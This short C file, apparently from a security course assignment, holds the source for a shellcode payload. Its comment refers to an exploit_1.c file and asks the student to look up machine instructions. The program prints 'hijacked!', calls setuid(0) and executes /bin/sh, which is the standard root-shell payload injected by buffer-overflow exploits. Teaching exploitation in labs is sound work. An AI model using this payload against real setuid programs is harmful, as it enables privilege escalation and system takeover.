/* shellcode.c */

/* This is partially the foundation for the machine code instructions that
 * we've already put into exploit_1.c for you. You need to lookup first two
 * lines (printf and setuid code) machine instructions to add*/

#include <stdio.h>

int main() {
  printf("hijacked!\n");
  setuid(0);
  char *name[2];
  name[0] = "/bin/sh";
  name[1] = NULL;
  execve(name[0], name, NULL);
} 
